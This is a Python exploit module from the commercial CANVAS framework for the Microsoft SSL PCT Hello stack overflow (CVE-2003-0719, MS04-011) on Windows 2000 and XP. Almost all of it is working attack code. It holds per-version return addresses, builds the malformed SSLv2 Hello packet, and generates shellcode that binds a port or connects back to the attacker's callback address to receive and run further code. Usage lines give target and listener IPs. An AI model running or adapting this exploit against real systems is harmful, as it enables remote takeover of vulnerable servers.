#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2004-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef

NAME='Microsoft SSL PCT Hello Overflow'
DESCRIPTION='Microsoft SSL PCT Hello Stack Overflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='13/04/2004'
DOCUMENTATION["CVE Name"] = "CVE-2003-0719"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0719"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/bulletin/MS04-011.mspx'
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION['Notes']=''

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP']
PROPERTY['MSADV']='MS04-011-SSL-PCT'

NOTES="""
Generate a certificate for IIS:
makecert -sr LocalMachine -ss My -n CN=ServiceModelSamples-HTTPS-Server -sky exchange -sk ServiceModelSamples-HTTPS-Key

Tested on:
Windows 2000 Server SP0 English OOTB
Windows 2000 Server SP1 English OOTB
Windows 2000 Server SP2 English OOTB
Windows 2000 Server SP3 English OOTB
Windows 2000 Server SP4 English OOTB
Windows 2000 Advanced Server SP4 French OOTB
Windows XP Professional SP0 English OOTB
Windows XP Professional SP1a English OOTB

Usage:
./commandlineInterface.py -v 1 -p 5555
./exploits/ms04_011_sslpct/ms04_011_sslpct.py -v 6 -t 10.10.13.135 -l 10.10.13.1 -d 5555
"""

CHANGELOG="""
"""

#dssbase.dll|dssenh.dll is mapped at the same address for several localizations
#that's the best we can do reliability-wise
targets={
    0: ['Autoversioning (N/A)',0],
    1: ['Windows 2000 SP0 English',0x77cfa2e9],
    2: ['Windows 2000 SP1 English',0x691fdd14],
    3: ['Windows 2000 SP2',0x67419948],
    4: ['Windows 2000 SP3',0x67419938],
    5: ['Windows 2000 SP4',0x67419ce8],
    6: ['Windows XP Professional SP0',0xffb7de9],
    7: ['Windows XP Professional SP1a',0xffb832f],
}

class theexploit(tcpexploit):
    def __init__(self):  
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.port=443
        self.version=0
        self.ssl=0
        return

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.WIN32MOSDEF]

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        return

    def test(self):
        self.getArgs()
        s=self.getSSLConnection()
        if s==None:
            return 0
        return 1

    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        import shellcodeGenerator
        sc=shellcodeGenerator.win32()
        sc.addAttr('findeipnoesp',{'subespval':0})
        if host=='0.0.0.0':
            sc.addAttr('BindMosdef',{'port':port})
        else:
            sc.addAttr('tcpconnect',{'port':port,'ipaddress':host}) 
        sc.addAttr('RecvExecWin32',{'socketreg':'FDSPOT'}) #MOSDEF
        sc.addAttr('ExitThread',None)
        self.shellcode=sc.get()
        return self.shellcode
    
    def connectToHost(self,host,port):
        s=self.gettcpsock()
        try:
            s.connect((host,port))
        except:
            self.raiseError('Error connecting to %s:%d'%(host,port))
        return s

    def connectTCP(self,port):
        try:
            s=self.connectToHost(self.host,port) 
        except:
            return None
        return s
        
    def connectWWW(self):
        return self.connectTCP(443)
    
    def connectSNEWS(self):
        return self.connectTCP(563)
    
    def connectIMAPS(self):
        return self.connectTCP(993)
    
    def connectPOP3S(self):
        return self.connectTCP(995)

    def connectLDAPS(self):
        return self.connectTCP(636)

    def connectLDAPssl(self):
        return self.connectTCP(3269)
    
    def connectSMTP(self):
        try:
            s=self.connectToHost(self.host,25) 
        except:
            return None
        self.websend(s,'EHLO localhost\r\n')
        try:
            data=self.webrecv(s)
        except:
            data=''
        self.log('EHLO returned %s'%(data))
        self.websend(s,'STARTTLS\r\n')
        try:
            data=self.webrecv(s)
        except:
            data=''
        if data.count('Unable to initialize security subsystem')>0:
            self.log('SMTP SSL not enabled')
            return None
        if data.count('SMTP server ready')>0:
            self.log('SMTP SSL available')
            return s
        self.log('Unexpected SMTP reply: %s'%(data))
        return None
        
    def getSSLConnection(self):
        s=None
        self.log('Trying SSL WWW')
        s=self.connectWWW()
        if s==None:
            self.log('Trying IMAPS')
            s=self.connectIMAPS()
        if s==None:
            self.log('Trying SMTP STARTTLS')
            s=self.connectSMTP()
        if s==None:
            self.log('Trying POP3S')
            s=self.connectPOP3S()
        if s==None:
            self.log('Trying SNEWS')
            s=self.connectSNEWS()
        if s==None:
            self.log('Trying LDAPssl')
            s=self.connectLDAPssl()
        if s==None:
            self.log('Trying LDAPS')
            s=self.connectLDAPS()
        return s

    def sslV2Hello(self,eip):
        #SSLv2 PCT Juliano Rizzo Hello header
        #This is a crafty little header as it manages to also be valid opcode
        #and still be a valid SSLv2 PCT Hello trigger packet
        #80496fc:       80 62 01 02             andb   $0x2,0x1(%edx)
        #8049700:       bd 00 01 00 01          mov    $0x1000100,%ebp
        #8049705:       00 16                   add    %dl,(%esi)
        #8049707:       8f 82 01 00 00 00       popl   0x1(%edx)
        #804970d:       00 00                   add    %al,(%eax)
        #This is needed as the ptr on the stack points to start of packet
        packet=''
        packet+='\x80\x66\x01\x02\xbd\x00\x01\x00\x01\x00\x16\x8f\x86\x01\x00\x00\x00'
        packet+='\xeb\x0f'+'A'*11
        self.log('Using return address: 0x%08x'%(eip))
        packet+=struct.pack('<L',~eip)
        packet+=self.shellcode
        return packet

    def run(self):
        self.getArgs()
        self.setInfo('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        self.log('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        if self.version==0:
            self.log('Autoversioning not available')
            return 0
        self.info,self.eip=targets[self.version]
        self.setProgress(25)
        s=self.getSSLConnection()
        if s==None:
            self.log('No SSL connection was found!')
            return 0
        self.setProgress(50)
        self.websend(s,self.sslV2Hello(self.eip))
        self.log('SSLv2 PCT HELLO sent')
        self.setProgress(75)
        time.sleep(3)
        s.close()
        self.setProgress(100)
        if self.ISucceeded():
            self.log('%s attacking %s:%d (succeeded!)'%(NAME,self.host,self.port))
            self.setInfo('%s attacking %s:%d (succeeded!)'%(NAME,self.host,self.port))
            return 1
        self.setInfo('%s attacking %s:%d (failed!)'%(NAME,self.host,self.port))
        return 0
    
    def displayVersions(self):
        i=0
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i=i+1
        return

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v%s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
